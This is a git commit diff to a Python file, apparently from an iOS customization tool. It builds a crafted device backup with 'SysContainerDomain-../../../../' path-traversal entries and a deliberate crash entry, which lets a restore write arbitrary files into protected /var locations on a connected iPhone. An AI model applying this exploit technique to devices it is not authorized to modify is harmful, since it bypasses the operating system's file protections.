98cca8dc4a6312ce6f53cd256004beb2bea8cf33
Skadz <46767289+skadz108@users.noreply.github.com>
2024-12-04 22:41:54 -0700

    update restore code

--- sparserestore/restore.py
+++ sparserestore/restore.py
@@ -1,26 +1,17 @@
-from . import backup
-from pymobiledevice3.lockdown import create_using_usbmux
-from pymobiledevice3.services.mobilebackup2 import Mobilebackup2Service
-from tempfile import TemporaryDirectory
-from pathlib import Path
+from . import backup, perform_restore
 
 def restore_file(fp: str, restore_path: str, restore_name: str):
     contents = open(fp, "rb").read()
 
     back = backup.Backup(files=[
-        backup.Directory("", "RootDomain", owner=33, group=33),
-        backup.Directory("Library", "RootDomain", owner=33, group=33),
-        backup.Directory("Library/Preferences", "RootDomain", owner=33, group=33),
-        backup.ConcreteFile("Library/Preferences/sparsetemp", "RootDomain", owner=33, group=33, contents=contents),
+        backup.Directory("", "RootDomain"),
+        backup.Directory("Library", "RootDomain"),
+        backup.Directory("Library/Preferences", "RootDomain"),
+        backup.ConcreteFile("Library/Preferences/sparsetemp", "RootDomain", owner=33, group=33, contents=contents, inode=0),
         backup.Directory("", f"SysContainerDomain-../../../../../../../../var/.backup.i{restore_path}", owner=33, group=33),
-        backup.ConcreteFile("", f"SysContainerDomain-../../../../../../../../var/.backup.i{restore_path}{restore_name}", owner=33, group=33, contents=contents),
-            backup.Directory("", "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/sparsetemp", owner=33, group=33),
+        backup.ConcreteFile("", f"SysContainerDomain-../../../../../../../../var/.backup.i{restore_path}{restore_name}", owner=33, group=33, contents=b"", inode=0),
+        backup.ConcreteFile("", "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/sparsetemp", contents=b""),
+        backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b"")
     ])
 
-    with TemporaryDirectory() as backup_dir:
-        backup_dir_path = Path(backup_dir)
-        back.write_to_directory(backup_dir_path)
-        
-        lockdown = create_using_usbmux()
-        with Mobilebackup2Service(lockdown) as mb:
-            mb.restore(backup_dir, system=True, reboot=False, copy=False, source=".")
+    perform_restore(backup=back)
